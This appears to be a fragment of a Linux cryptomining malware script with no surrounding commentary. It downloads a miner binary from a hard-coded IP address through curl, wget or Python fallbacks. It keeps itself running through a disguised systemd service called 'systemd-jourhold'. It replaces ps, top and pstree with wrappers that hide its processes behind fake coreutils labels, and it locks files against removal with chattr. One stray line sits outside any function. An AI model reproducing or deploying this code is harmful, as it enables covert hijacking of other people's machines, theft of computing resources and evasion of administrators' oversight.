MINER_URL="http://167.179.119.120/QiubA21m0n1en7u.ben"
MINER_SIZE="7047392"
MINER_BASE="/etc"
DOWNLOADER="curl"

download_file() {
    local url="$1" output="$2" fallback_url="${3:-$MINER_URL}" tmpfile="${output}.tmp.$$"
    rm -f "$tmpfile" 2>/dev/null
    case "$DOWNLOADER" in
        curl)
            curl --connect-timeout 30 --retry 3 --max-time 300 -o "$tmpfile" "$url" 2>/dev/null ||             curl --connect-timeout 30 --retry 3 --max-time 300 -o "$tmpfile" "$fallback_url" 2>/dev/null
            ;;
        wget)
            wget --timeout=30 --tries=3 -O "$tmpfile" "$url" 2>/dev/null ||             wget --timeout=30 --tries=3 -O "$tmpfile" "$fallback_url" 2>/dev/null
            ;;
        python3|python)
            "$DOWNLOADER" -c "
import urllib.request
for u in ['$url', '$fallback_url']:
    try:
        urllib.request.urlretrieve(u, '$tmpfile')
        if __import__('os').path.getsize('$tmpfile') > 0: raise SystemExit(0)
    except Exception: continue
raise SystemExit(1)
" 2>/dev/null
            ;;
        *) return 1 ;;
    esac
    [ -s "$tmpfile" ] && mv "$tmpfile" "$output" 2>/dev/null && return 0
    rm -f "$tmpfile" 2>/dev/null
    return 1
}

        chattr -i "$miner_path" 2>/dev/null

check_and_restart_service() {
    local sctl="systemctl"
    [ ! -w "/etc" ] && sctl="systemctl --user"
    if ! $sctl is-active --quiet systemd-jourhold.service 2>/dev/null; then
        $sctl daemon-reload 2>/dev/null
        $sctl enable systemd-jourhold.service 2>/dev/null
        $sctl start systemd-jourhold.service 2>/dev/null
    fi
}

check_hide_commands() {
    local binmap="$HIDE_DIR/binmap"
    [ "$MINER_BASE" = "/tmp" ] && binmap="/tmp/.X10-unix/.hide/binmap"

    for bin in ps top pstree; do
        local wrapper_path orig_path
        wrapper_path=$(command -v "$bin" 2>/dev/null)
        [ -z "$wrapper_path" ] && continue

        wrapper_path=$(readlink -f "$wrapper_path" 2>/dev/null || realpath "$wrapper_path" 2>/dev/null || echo "$wrapper_path")

        orig_path=$(grep "^${bin}:" "$binmap" 2>/dev/null | head -1 | cut -d: -f2)

        if [ -n "$orig_path" ] && [ -f "$orig_path" ]; then
            if file "$wrapper_path" 2>/dev/null | grep -q "ELF"; then
                mv "$wrapper_path" "$orig_path" 2>/dev/null
                local orig_mode=$(stat -c%a "$orig_path" 2>/dev/null || echo "755")
                printf '#!/bin/bash\n# GNU %s — system process inspector (coreutils)\nexec "%s" "$@" | grep -v "zzh\\|pnscan"\n' "$bin" "$orig_path" > "$wrapper_path"
                chmod "$orig_mode" "$wrapper_path" 2>/dev/null || chmod 755 "$wrapper_path" 2>/dev/null
            fi
            chattr +i "$wrapper_path" 2>/dev/null
            chattr +i "$orig_path" 2>/dev/null
        else
            if [ -f "$wrapper_path" ] && ! file "$wrapper_path" 2>/dev/null | grep -q "ELF"; then
                if ! grep -q "grep.*zzh" "$wrapper_path" 2>/dev/null; then
                    printf '#!/bin/bash\nexec "%s" "$@" | grep -v "zzh\\|pnscan"\n' "${wrapper_path}.orig" > "$wrapper_path.tmp" 2>/dev/null && mv "$wrapper_path.tmp" "$wrapper_path" 2>/dev/null
                fi
            fi
        fi
    done
}
